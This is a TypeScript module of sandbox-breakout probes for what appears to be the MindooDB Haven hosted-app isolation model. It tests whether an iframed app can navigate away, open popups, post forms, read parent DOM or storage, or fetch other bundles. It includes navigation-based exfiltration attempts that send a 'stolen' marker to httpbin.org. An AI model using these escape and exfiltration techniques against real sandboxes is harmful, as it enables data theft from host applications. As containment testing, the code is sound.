/**
 * Breakout probes: deliberate attempts to escape the hosted-app sandbox.
 *
 * The Network tab asks "may I call this host?". These probes ask the harder
 * question: "can I leave at all?" Each one attacks a specific layer described in
 * `mindoodb/docs/hosted-app-isolation.md`, so a run doubles as a live check that
 * the documented containment is really in place.
 *
 * Two things to keep in mind when reading the results:
 *
 * - **A throw is a pass.** Every probe here is supposed to fail. `contained`
 *   means the browser or Haven refused; `escaped` means the app got out and the
 *   isolation model has a hole.
 * - **External mode is expected to fail almost all of them.** External apps run
 *   on their own origin with `allow-same-origin`, outside Haven's policy. That
 *   is why external mode is restricted to loopback dev servers — these results
 *   are the argument for that rule, not a bug report.
 *
 * @module isolationProbes
 */
import { readMindooDBAppHostingMode, type MindooDBAppHostingMode } from "mindoodb-app-sdk";

/**
 * Where a successful breakout would send data. httpbin is deliberately the same
 * host the Network tab uses as its not-on-the-allowlist example, so both tabs
 * tell one story.
 */
export const BREAKOUT_ORIGIN = "https://httpbin.org";

/**
 * Bundle id a hosted app would guess to reach a *different* app's assets. The
 * wrapper's `frame-src` names one bundle prefix, so this must not resolve.
 */
export const OTHER_BUNDLE_ID = "mindoodb-breakout-probe";

export type IsolationProbeId =
  | "self-navigation"
  | "cross-bundle-navigation"
  | "top-navigation"
  | "parent-navigation"
  | "nested-iframe"
  | "popup"
  | "form-action"
  | "parent-dom"
  | "opaque-storage"
  | "service-worker"
  | "cross-bundle-fetch"
  | "haven-page-fetch"
  | "webrtc";

/** `contained` is the desired result for every probe except the WebRTC one. */
export type IsolationOutcome = "contained" | "escaped" | "inconclusive";

export interface IsolationProbe {
  id: IsolationProbeId;
  label: string;
  /** The isolation layer this attacks, phrased the way the doc phrases it. */
  layer: string;
  /** What should happen in hosted mode. */
  hostedExpectation: string;
  /**
   * True when success would navigate the app away and end the session. Those
   * are kept out of "run all" so one click cannot destroy the demo.
   */
  endsSession?: boolean;
}

export interface IsolationProbeResult {
  id: IsolationProbeId;
  outcome: IsolationOutcome;
  detail: string;
  elapsedMs: number;
}

export const ISOLATION_PROBES: IsolationProbe[] = [
  {
    id: "self-navigation",
    label: "Navigate this frame to httpbin",
    layer: "Wrapper document, frame-src pinned to this bundle",
    hostedExpectation:
      "Refused before any request leaves the browser. The violation is reported on the wrapper, not here, so this app sees nothing at all — check Haven for the blocked-navigation toast.",
    endsSession: true,
  },
  {
    id: "cross-bundle-navigation",
    label: "Navigate to another app's bundle",
    layer: "Wrapper document, frame-src path scope",
    hostedExpectation:
      "Refused. The wrapper names this bundle's prefix including its path, so a sibling bundle is off limits even though it is the same origin.",
    endsSession: true,
  },
  {
    id: "top-navigation",
    label: "Navigate Haven's top window",
    layer: "Sandbox without allow-top-navigation",
    hostedExpectation: "Throws. The app may not steer the tab Haven runs in.",
    endsSession: true,
  },
  {
    id: "parent-navigation",
    label: "Navigate the wrapper (the parent frame)",
    layer: "Sandboxed-navigation flag",
    hostedExpectation:
      "Throws. This is the attack that would replace the wrapper with a document that has no frame-src; a sandboxed frame may not navigate an ancestor, which is what makes the wrapper's policy authoritative.",
    endsSession: true,
  },
  {
    id: "nested-iframe",
    label: "Embed httpbin in a nested iframe",
    layer: "App CSP, frame-src 'self'",
    hostedExpectation:
      "Blocked, and unlike the navigation probes this one is visible here: the violation fires on this document, so it shows up in the report below.",
  },
  {
    id: "popup",
    label: "Open a popup window",
    layer: "Sandbox allow-popups capability",
    hostedExpectation:
      "Blocked unless the registration grants popups. This is the one switch that reopens a general egress path, so seeing it succeed after you tick the box is the point.",
  },
  {
    id: "form-action",
    label: "Submit a form to httpbin",
    layer: "App CSP, form-action",
    hostedExpectation: "Blocked. A form post is egress like any other request.",
  },
  {
    id: "parent-dom",
    label: "Read Haven's DOM and URL",
    layer: "Opaque origin",
    hostedExpectation: "Throws. No parent DOM, no Haven URL, no other app's frame.",
  },
  {
    id: "opaque-storage",
    label: "Read localStorage",
    layer: "Opaque origin",
    hostedExpectation:
      "Throws. An opaque origin has no storage bucket at all, which is why the SDK offers a Haven-backed storage shim for hosted apps.",
  },
  {
    id: "service-worker",
    label: "Register a service worker",
    layer: "Opaque origin",
    hostedExpectation:
      "Rejects. The app cannot install a worker of its own to intercept its traffic.",
  },
  {
    id: "cross-bundle-fetch",
    label: "Fetch another app's bundle assets",
    layer: "Haven service worker",
    hostedExpectation: "403 from Haven's worker. Guessing a bundle id gets you nothing.",
  },
  {
    id: "haven-page-fetch",
    label: "Fetch Haven's own page",
    layer: "Haven service worker",
    hostedExpectation:
      "403. Same origin after install, but only this bundle's asset prefix is readable.",
  },
  {
    id: "webrtc",
    label: "Open an RTCPeerConnection",
    layer: "Not covered by CSP",
    hostedExpectation:
      "Succeeds, and that is the honest answer. CSP has no directive for WebRTC, so it stays on the residual-risk list rather than being contained.",
  },
];

export function isolationProbe(id: IsolationProbeId): IsolationProbe {
  const probe = ISOLATION_PROBES.find((entry) => entry.id === id);
  if (!probe) {
    throw new Error(`Unknown isolation probe "${id}".`);
  }
  return probe;
}

export function safeProbes(): IsolationProbe[] {
  return ISOLATION_PROBES.filter((probe) => !probe.endsSession);
}

export function sessionEndingProbes(): IsolationProbe[] {
  return ISOLATION_PROBES.filter((probe) => probe.endsSession);
}

/**
 * The URL a breakout would exfiltrate to. The marker stands in for whatever the
 * app scraped out of its mapped databases — the point of a navigation-based
 * leak is that the payload rides along in the query string.
 */
export function buildBreakoutUrl(marker: string): string {
  const url = new URL("/get", BREAKOUT_ORIGIN);
  url.searchParams.set("stolen", marker);
  return url.toString();
}

/**
 * Path a hosted app would use to reach a sibling bundle. Relative, because the
 * app does not know Haven's origin or its own bundle id, and `..` from the
 * bundle prefix is exactly the guess an attacker would make.
 */
export function crossBundlePath(file = "index.html"): string {
  return `../${OTHER_BUNDLE_ID}/${file}`;
}

export function formatProbeError(error: unknown): string {
  if (error instanceof DOMException) {
    return `${error.name}: ${error.message}`;
  }
  if (error instanceof Error) {
    return error.message ? `${error.name}: ${error.message}` : error.name;
  }
  return String(error);
}

export interface IsolationSummary {
  contained: number;
  escaped: number;
  inconclusive: number;
}

export function summarizeIsolationResults(results: IsolationProbeResult[]): IsolationSummary {
  return results.reduce<IsolationSummary>(
    (summary, result) => ({ ...summary, [result.outcome]: summary[result.outcome] + 1 }),
    { contained: 0, escaped: 0, inconclusive: 0 },
  );
}

/**
 * What the probe is expected to do in the mode the app is actually running in.
 *
 * External apps keep their own origin and their own storage, and Haven applies
 * no policy to them, so telling the reader "this should be blocked" there would
 * be wrong.
 */
export function describeExpectation(
  probe: IsolationProbe,
  hosting: MindooDBAppHostingMode,
): string {
  if (hosting === "hosted") {
    return probe.hostedExpectation;
  }
  return "External mode applies none of Haven's containment, so expect this to succeed. That is the reason external mode is limited to loopback dev servers.";
}

function delay(ms: number) {
  return new Promise<void>((resolve) => {
    window.setTimeout(resolve, ms);
  });
}

function elapsedSince(startedAt: number) {
  return Math.max(0, Math.round(performance.now() - startedAt));
}

/**
 * Ask for a navigation and then check whether we are still here.
 *
 * There is no event for "navigation refused by CSP" on this document — the
 * violation is reported on the frame's parent — so the only signal available to
 * the app is that it still exists a moment later. When the navigation does go
 * through, this never returns: the document is gone.
 */
async function attemptNavigation(navigate: () => void): Promise<IsolationProbeResult["outcome"]> {
  const before = window.location.href;
  navigate();
  await delay(900);
  return window.location.href === before ? "contained" : "escaped";
}

/**
 * Did a frame we created actually load the cross-origin document we asked for?
 *
 * We cannot read a cross-origin document, and that is precisely the signal: a
 * frame CSP refused stays on `about:blank`, which an opaque-origin parent may
 * still read, while a frame that really loaded httpbin throws on the same read.
 */
function inspectFrameNavigation(frame: HTMLIFrameElement): {
  outcome: IsolationOutcome;
  detail: string;
} {
  try {
    const href = frame.contentWindow?.location.href ?? "";
    if (!href || href === "about:blank") {
      return { outcome: "contained", detail: "The frame never left about:blank." };
    }
    return { outcome: "escaped", detail: `The frame loaded ${href}.` };
  } catch (error) {
    // Reading threw, so a real cross-origin document is sitting in there.
    return {
      outcome: "escaped",
      detail: `The frame loaded a cross-origin document (${formatProbeError(error)}).`,
    };
  }
}

async function runProbeById(id: IsolationProbeId): Promise<Omit<IsolationProbeResult, "elapsedMs">> {
  switch (id) {
    case "self-navigation": {
      const target = buildBreakoutUrl("mapped-database-contents");
      try {
        const outcome = await attemptNavigation(() => {
          window.location.href = target;
        });
        return {
          id,
          outcome,
          detail:
            outcome === "contained"
              ? `Still here after asking for ${target}. The navigation never happened and no request left the browser.`
              : `Navigated to ${target}.`,
        };
      } catch (error) {
        return { id, outcome: "contained", detail: formatProbeError(error) };
      }
    }

    case "cross-bundle-navigation": {
      const target = crossBundlePath();
      try {
        const outcome = await attemptNavigation(() => {
          window.location.href = target;
        });
        return {
          id,
          outcome,
          detail:
            outcome === "contained"
              ? `Still here after asking for ${target}.`
              : `Navigated to ${window.location.href}.`,
        };
      } catch (error) {
        return { id, outcome: "contained", detail: formatProbeError(error) };
      }
    }

    case "top-navigation": {
      const target = buildBreakoutUrl("top-navigation");
      try {
        // Reading `top.location.href` throws on its own across an opaque
        // boundary, so assign without reading first.
        window.top!.location.href = target;
        await delay(900);
        return {
          id,
          outcome: "contained",
          detail: "No error thrown, but Haven's tab did not move.",
        };
      } catch (error) {
        return { id, outcome: "contained", detail: formatProbeError(error) };
      }
    }

    case "parent-navigation": {
      const target = buildBreakoutUrl("parent-navigation");
      try {
        window.parent.location.href = target;
        await delay(900);
        return {
          id,
          outcome: window.parent === window.self ? "inconclusive" : "contained",
          detail:
            window.parent === window.self
              ? "This app is not framed, so there is no parent to navigate."
              : "No error thrown, but the parent frame did not move.",
        };
      } catch (error) {
        return { id, outcome: "contained", detail: formatProbeError(error) };
      }
    }

    case "nested-iframe": {
      const target = buildBreakoutUrl("nested-iframe");
      const frame = document.createElement("iframe");
      frame.setAttribute("aria-hidden", "true");
      frame.style.display = "none";
      frame.src = target;
      document.body.appendChild(frame);
      await delay(1200);
      const inspection = inspectFrameNavigation(frame);
      frame.remove();
      return {
        id,
        outcome: inspection.outcome,
        detail: `Requested ${target} in a nested iframe. ${inspection.detail}`,
      };
    }

    case "popup": {
      const target = buildBreakoutUrl("popup");
      // Deliberately no `noopener`: that feature makes window.open return null
      // even on success, which would report every popup as blocked.
      const opened = window.open(target, "_blank");
      if (!opened) {
        return {
          id,
          outcome: "contained",
          detail: "window.open returned null. The sandbox has no allow-popups capability.",
        };
      }
      opened.close();
      return {
        id,
        outcome: "escaped",
        detail: `A popup opened to ${target} and was closed again. Popups are granted for this app, so this is an open egress path by configuration.`,
      };
    }

    case "form-action": {
      const target = buildBreakoutUrl("form-action");
      const sink = document.createElement("iframe");
      sink.name = `probe-form-sink-${Date.now()}`;
      sink.setAttribute("aria-hidden", "true");
      sink.style.display = "none";
      document.body.appendChild(sink);

      const form = document.createElement("form");
      form.method = "GET";
      form.action = target;
      // Targeting a hidden frame keeps a successful post from replacing the app.
      form.target = sink.name;
      form.style.display = "none";
      document.body.appendChild(form);
      try {
        form.submit();
        await delay(900);
        const inspection = inspectFrameNavigation(sink);
        return {
          id,
          outcome: inspection.outcome,
          detail: `Submitted to ${target} into a hidden frame. ${inspection.detail}`,
        };
      } catch (error) {
        return { id, outcome: "contained", detail: formatProbeError(error) };
      } finally {
        form.remove();
        sink.remove();
      }
    }

    case "parent-dom": {
      try {
        const title = window.parent.document.title;
        return {
          id,
          outcome: "escaped",
          detail: `Read the parent document. Its title is "${title}".`,
        };
      } catch (error) {
        return { id, outcome: "contained", detail: formatProbeError(error) };
      }
    }

    case "opaque-storage": {
      try {
        const probeKey = "mindoodb-breakout-probe";
        window.localStorage.setItem(probeKey, "1");
        window.localStorage.removeItem(probeKey);
        return {
          id,
          outcome: "escaped",
          detail: "localStorage is readable and writable, so this document has a real origin.",
        };
      } catch (error) {
        return { id, outcome: "contained", detail: formatProbeError(error) };
      }
    }

    case "service-worker": {
      if (!("serviceWorker" in navigator)) {
        return {
          id,
          outcome: "contained",
          detail: "navigator.serviceWorker is not available in this document.",
        };
      }
      try {
        await navigator.serviceWorker.register("./breakout-sw.js");
        return {
          id,
          outcome: "escaped",
          detail: "Registered a service worker of the app's own.",
        };
      } catch (error) {
        // An opaque origin rejects with SecurityError before it ever fetches
        // the script. Any other rejection just means the script is missing —
        // this bundle ships no such file — which proves nothing either way.
        const blockedByOrigin = error instanceof DOMException && error.name === "SecurityError";
        return {
          id,
          outcome: blockedByOrigin ? "contained" : "inconclusive",
          detail: blockedByOrigin
            ? formatProbeError(error)
            : `${formatProbeError(error)} — this looks like the missing probe script rather than the origin refusing registration.`,
        };
      }
    }

    case "cross-bundle-fetch": {
      const target = crossBundlePath();
      try {
        const response = await fetch(target);
        return {
          id,
          outcome: response.ok ? "escaped" : "contained",
          detail: `HTTP ${response.status} for ${target}.`,
        };
      } catch (error) {
        return { id, outcome: "contained", detail: formatProbeError(error) };
      }
    }

    case "haven-page-fetch": {
      try {
        const response = await fetch("/index.html");
        return {
          id,
          outcome: response.ok ? "escaped" : "contained",
          detail: `HTTP ${response.status} for Haven's own /index.html.`,
        };
      } catch (error) {
        return { id, outcome: "contained", detail: formatProbeError(error) };
      }
    }

    case "webrtc": {
      if (typeof RTCPeerConnection === "undefined") {
        return {
          id,
          outcome: "contained",
          detail: "RTCPeerConnection is not available in this document.",
        };
      }
      const connection = new RTCPeerConnection();
      try {
        connection.createDataChannel("probe");
        const offer = await connection.createOffer();
        return {
          id,
          outcome: "inconclusive",
          detail: `Created a peer connection and an SDP offer (${offer.type}). No CSP directive covers this; reaching a peer still needs signalling, which does go through the allowlist.`,
        };
      } catch (error) {
        return { id, outcome: "contained", detail: formatProbeError(error) };
      } finally {
        connection.close();
      }
    }

    default: {
      const exhaustive: never = id;
      throw new Error(`Unhandled isolation probe "${String(exhaustive)}".`);
    }
  }
}

export async function runIsolationProbe(id: IsolationProbeId): Promise<IsolationProbeResult> {
  const startedAt = performance.now();
  try {
    const result = await runProbeById(id);
    return { ...result, elapsedMs: elapsedSince(startedAt) };
  } catch (error) {
    // A probe that throws on its way out still tells us the app was stopped.
    return {
      id,
      outcome: "contained",
      detail: formatProbeError(error),
      elapsedMs: elapsedSince(startedAt),
    };
  }
}

export function currentHostingMode(): MindooDBAppHostingMode {
  return readMindooDBAppHostingMode();
}
